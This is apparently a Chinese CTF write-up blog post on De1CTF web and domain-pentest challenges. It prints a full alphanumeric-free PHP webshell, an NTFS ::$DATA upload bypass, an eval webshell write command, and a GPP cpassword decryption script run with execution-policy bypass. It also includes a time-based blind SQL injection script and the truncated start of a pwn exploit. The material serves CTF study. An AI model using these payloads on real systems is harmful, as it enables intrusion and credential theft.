class="keyword">if</span>($_POST[<span class="string">"submit"</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span> (($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">2048</span>) &amp;&amp; Check())&#123;</span><br><span class="line">        <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $filename=md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">"_"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">            move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $filename);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"save in:"</span> . $sandbox.<span class="string">"/"</span> . $filename;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not Allow!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $BlackExts = <span class="keyword">array</span>(<span class="string">"php"</span>);</span><br><span class="line">    $ext = explode(<span class="string">"."</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">    $exts = trim(end($ext));</span><br><span class="line">    $file_content = file_get_contents($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/[a-z0-9;~^`&amp;|]/is'</span>,$file_content)  &amp;&amp; </span><br><span class="line">        !in_array($exts, $BlackExts) &amp;&amp; </span><br><span class="line">        !preg_match(<span class="string">'/\.\./'</span>,$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>])) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>审计一下发现文件名处有过滤，并且上传的文件中不能包含<code>数字</code>、<code>小写字母</code>、<code>;</code>、<code>~</code>、<code>^</code>、<code>&amp;</code>、<code>|</code>、<code>反引号</code>等，根据这个规则，肯定需要构造无数字字母的shell了，之前看过<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html#_4">p神的一篇文章</a>讲过，不过这里由于<code>；</code>也被过滤，需要用<code>短标签</code>来绕过。</p><p>BP抓包发现服务器是<code>Windows server</code>，这种情况下的文件上传可以利用<code>NTFS</code>的<code>DATA</code>特性进行绕过，参考<a href="http://www.mottoin.com/detail/1939.html">这里</a>用NTFS特性和无数字字母shell绕过限制上传，组策略泄露密码。</p><p>成功拿到shell之后，在服务器上找到了flag的压缩包，解压需要密码，这里考了一种域渗透，利用SYSVOL还原组策略中保存的密码，参考<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">这篇文章</a>。</p><p>解题思路很明确了：利用NTFS特性和无数字字母shell绕过限制上传，组策略泄露密码。</p><h4 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h4><p>结合p神那篇文章里给出的shell构造方法，对其进行短标签拼接之后，shell脚本如下（由hpdoger师傅提供）：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=$_=[]<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span>=$_=@<span class="string">"$_"</span><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>=$_=$_[<span class="string">'!'</span>==<span class="string">'@'</span>]<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span>=$____=<span class="string">'_'</span><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span>  <span class="comment">//S</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>=$___=$__<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___.=$__<span class="meta">?&gt;</span> <span class="comment">//SY</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___.=$__<span class="meta">?&gt;</span> <span class="comment">//SYS</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___.=$__<span class="meta">?&gt;</span> <span class="comment">//SYST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___.=$__<span class="meta">?&gt;</span> <span class="comment">//SYSTE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___.=$__<span class="meta">?&gt;</span> <span class="comment">//SYSTEM</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span>=$____.=$__<span class="meta">?&gt;</span> <span class="comment">//_P</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span>=$____.=$__<span class="meta">?&gt;</span> <span class="comment">//_PO</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span>=$____.=$__<span class="meta">?&gt;</span> <span class="comment">//_POS</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span>=$____.=$__<span class="meta">?&gt;</span> <span class="comment">//_POST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>=$_=$$____<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>=$___($_[_])<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//system($_POST[_]) </span></span><br><span class="line"><span class="comment">//用的时候注释要去掉</span></span><br></pre></td></tr></table></figure><p>需要注意一点：<code>assert</code>和<code>eval</code>在php7.2不属于函数，因此构造<code>system</code>。</p><p>利用NTFS的<code>DATA</code>特性绕过过滤上传小马，成功拿到shell：</p><p><img src="http://ggb0n.cool/images/de1ctf16.png" alt=""></p><p>利用这个shell，再传一个普通shell上去：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">_=<span class="keyword">echo</span> ^<span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[a]); &gt; ma.php</span><br></pre></td></tr></table></figure><p>查看一下是否成功写入：</p><p><img src="http://ggb0n.cool/images/de1ctf17.png" alt=""></p><p>成功写入普通shell，蚁剑连接即可，在<code>Hint</code>目录下发现疑似flag的压缩包：</p><p><img src="http://ggb0n.cool/images/de1ctf14.png" alt=""></p><p>压缩包下载出来之后需要密码，终端<code>net user /domain</code>看到存在<code>HintZip_Pass</code>用户，显然，这个用户密码应该就是压缩包的密码了，下面就需要进行域渗透了。</p><p>终端<code>net use</code>获取到如下信息：</p><p><img src="http://ggb0n.cool/images/de1ctf20.png" alt=""></p><p>看到<code>SYSVOL</code>组策略的存在，读取其<code>Groups.xml</code>，内容如下：</p><p><img src="http://ggb0n.cool/images/de1ctf19.png" alt=""></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Groups</span> <span class="attr">clsid</span>=<span class="string">"&#123;3125E937-EB16-4b4c-9934-544FC6D24D26&#125;"</span>&gt;</span><span class="tag">&lt;<span class="name">User</span> <span class="attr">clsid</span>=<span class="string">"&#123;DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1&#125;"</span> <span class="attr">name</span>=<span class="string">"HintZip_Pass"</span> <span class="attr">image</span>=<span class="string">"2"</span> <span class="attr">changed</span>=<span class="string">"2020-04-15 14:43:23"</span> <span class="attr">uid</span>=<span class="string">"&#123;D33537C1-0BDB-44B7-8628-A6030A298430&#125;"</span>&gt;</span><span class="tag">&lt;<span class="name">Properties</span> <span class="attr">action</span>=<span class="string">"U"</span> <span class="attr">newName</span>=<span class="string">""</span> <span class="attr">fullName</span>=<span class="string">""</span> <span class="attr">description</span>=<span class="string">""</span> <span class="attr">cpassword</span>=<span class="string">"uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08"</span> <span class="attr">changeLogon</span>=<span class="string">"1"</span> <span class="attr">noChange</span>=<span class="string">"0"</span> <span class="attr">neverExpires</span>=<span class="string">"0"</span> <span class="attr">acctDisabled</span>=<span class="string">"0"</span> <span class="attr">userName</span>=<span class="string">"HintZip_Pass"</span>/&gt;</span><span class="tag">&lt;/<span class="name">User</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Groups</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中的<code>cpassword=&quot;uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08&quot;</code>就是该用户的密码，不过是经过AES加密的，参考域渗透那篇文章里的解密<code>ps</code>脚本：</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Get-DecryptedCpassword</span></span> &#123;</span><br><span class="line">    [<span class="type">CmdletBinding</span>()]</span><br><span class="line">    <span class="keyword">Param</span> (</span><br><span class="line">        [<span class="built_in">string</span>] <span class="variable">$Cpassword</span> </span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">#Append appropriate padding based on string length  </span></span><br><span class="line">        <span class="variable">$Mod</span> = (<span class="variable">$Cpassword</span>.length % <span class="number">4</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$Mod</span>) &#123;</span><br><span class="line">        <span class="string">'1'</span> &#123;<span class="variable">$Cpassword</span> = <span class="variable">$Cpassword</span>.Substring(<span class="number">0</span>,<span class="variable">$Cpassword</span>.Length <span class="literal">-1</span>)&#125;</span><br><span class="line">        <span class="string">'2'</span> &#123;<span class="variable">$Cpassword</span> += (<span class="string">'='</span> * (<span class="number">4</span> - <span class="variable">$Mod</span>))&#125;</span><br><span class="line">        <span class="string">'3'</span> &#123;<span class="variable">$Cpassword</span> += (<span class="string">'='</span> * (<span class="number">4</span> - <span class="variable">$Mod</span>))&#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$Base64Decoded</span> = [<span class="type">Convert</span>]::FromBase64String(<span class="variable">$Cpassword</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#Create a new AES .NET Crypto Object</span></span><br><span class="line">        <span class="variable">$AesObject</span> = <span class="built_in">New-Object</span> System.Security.Cryptography.AesCryptoServiceProvider</span><br><span class="line">        [<span class="built_in">Byte</span>[]] <span class="variable">$AesKey</span> = <span class="selector-tag">@</span>(<span class="number">0</span>x4e,<span class="number">0</span>x99,<span class="number">0</span>x06,<span class="number">0</span>xe8,<span class="number">0</span>xfc,<span class="number">0</span>xb6,<span class="number">0</span>x6c,<span class="number">0</span>xc9,<span class="number">0</span>xfa,<span class="number">0</span>xf4,<span class="number">0</span>x93,<span class="number">0</span>x10,<span class="number">0</span>x62,<span class="number">0</span>x0f,<span class="number">0</span>xfe,<span class="number">0</span>xe8,</span><br><span class="line">                             <span class="number">0</span>xf4,<span class="number">0</span>x96,<span class="number">0</span>xe8,<span class="number">0</span>x06,<span class="number">0</span>xcc,<span class="number">0</span>x05,<span class="number">0</span>x79,<span class="number">0</span>x90,<span class="number">0</span>x20,<span class="number">0</span>x9b,<span class="number">0</span>x09,<span class="number">0</span>xa4,<span class="number">0</span>x33,<span class="number">0</span>xb6,<span class="number">0</span>x6c,<span class="number">0</span>x1b)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#Set IV to all nulls to prevent dynamic generation of IV value</span></span><br><span class="line">        <span class="variable">$AesIV</span> = <span class="built_in">New-Object</span> Byte[](<span class="variable">$AesObject</span>.IV.Length) </span><br><span class="line">        <span class="variable">$AesObject</span>.IV = <span class="variable">$AesIV</span></span><br><span class="line">        <span class="variable">$AesObject</span>.Key = <span class="variable">$AesKey</span></span><br><span class="line">        <span class="variable">$DecryptorObject</span> = <span class="variable">$AesObject</span>.CreateDecryptor() </span><br><span class="line">        [<span class="built_in">Byte</span>[]] <span class="variable">$OutBlock</span> = <span class="variable">$DecryptorObject</span>.TransformFinalBlock(<span class="variable">$Base64Decoded</span>, <span class="number">0</span>, <span class="variable">$Base64Decoded</span>.length)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> [<span class="type">System.Text.UnicodeEncoding</span>]::Unicode.GetString(<span class="variable">$OutBlock</span>)</span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">catch</span> &#123;<span class="built_in">Write-Error</span> <span class="variable">$Error</span>[<span class="number">0</span>]&#125;</span><br><span class="line">&#125;  </span><br><span class="line"><span class="built_in">Get-DecryptedCpassword</span> <span class="string">"uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08"</span></span><br></pre></td></tr></table></figure><p>或者到<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1">这里</a>下载开源的解密脚本</p><p>用命令跑解密脚本<code>powershell.exe -executionpolicy bypass -file get-DecryptedCpassword.ps1</code></p><p><img src="http://ggb0n.cool/images/de1ctf15.png" alt=""></p><p>成功拿到密码，解密即可拿到flag以及下一题的提示：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag1: De1CTF&#123;GpP_11Is_SoOOO_Ea3333y&#125;</span><br><span class="line"></span><br><span class="line">Get flag2 Hint:</span><br><span class="line">hint1: You need De1ta user to get flag2</span><br><span class="line">hint2: De1ta user&#39;s password length is 1-8, and the password is composed of [0-9a-f].</span><br><span class="line">hint3: Pay attention to the extended rights of De1ta user on the domain.</span><br><span class="line">hint4: flag2 in Domain Controller (C:\Users\Administrator\Desktop\flag.txt)</span><br><span class="line"></span><br><span class="line">PS: Please do not damage the environment after getting permission, thanks QAQ.</span><br></pre></td></tr></table></figure><p>这道题学会了不少，Windows Server下的NTFS文件上传绕过、域渗透，在之前做过的题里很少见。</p><h3 id="Hard-Pentest-2"><a href="#Hard-Pentest-2" class="headerlink" title="Hard_Pentest_2"></a>Hard_Pentest_2</h3><p>域渗透-利用资源约束委派进行提权</p><h3 id="Mixture"><a href="#Mixture" class="headerlink" title="Mixture"></a>Mixture</h3><p>一道web+pwn题，这题是队里的大师傅们做的，我就摸鱼偷学点知识。</p><h4 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h4><p>首先利用<code>benchmark</code>注出admin的密码，从师傅那里漂到脚本学习了一番：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</span></span><br><span class="line"><span class="comment">#select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = 'test'</span></span><br><span class="line"><span class="comment">#select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA = 'xxx' and TABLE_NAME = 'xxx'</span></span><br><span class="line">string = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line">headers= &#123;</span><br><span class="line">    <span class="string">"Cookie"</span>:<span class="string">"PHPSESSID=g6u5esdng9h7a2ei3m93srf0mp"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line"> <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">  <span class="comment"># print(j)</span></span><br><span class="line">  url = <span class="string">"http://134.175.185.244/member.php?orderby=,ISNULL(CASE WHEN (ascii(substr((select password from member where id=1),&#123;0&#125;,1))=&#123;1&#125;) THEN BENCHMARK(2000000,SHA1(123)) ELSE 2 END)"</span>.format(i,j)</span><br><span class="line">  r=session.get(url,headers = headers,cookies = cookies)</span><br><span class="line">  <span class="comment"># print(url)</span></span><br><span class="line">  sec=r.elapsed.seconds</span><br><span class="line">  <span class="keyword">if</span> sec &gt; <span class="number">3</span>:</span><br><span class="line">   string += chr(j)</span><br><span class="line">   print(chr(j))</span><br><span class="line">   <span class="keyword">break</span></span><br><span class="line">print(string)</span><br></pre></td></tr></table></figure><p>后面发现有个<code>Mininclude</code>，后面就是pwn的了，从大师傅那里拿到的源码，仔细读读，真的不会…</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">headers= &#123;</span><br><span class="line">    <span class="string">"Cookie"</span>:<span class="string">"PHPSESSID=g6u5esdng9h7a2ei3m93srf0mp"</span></span><br><span class="line">&#125;</span><br><span class="line">php_base = <span class="number">0x7f546c3f7000</span></span><br><span class="line">libc_base = <span class="number">0x7f546eacb000</span></span><br><span class="line">minclude_base = <span class="number">0x7f546d84a000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#filename = "index.php" #Here input filename you want to read</span></span><br><span class="line">INITIAL = <span class="number">1526</span> - <span class="number">9</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> INITIAL, php_base, minclude_base, libc_base</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; 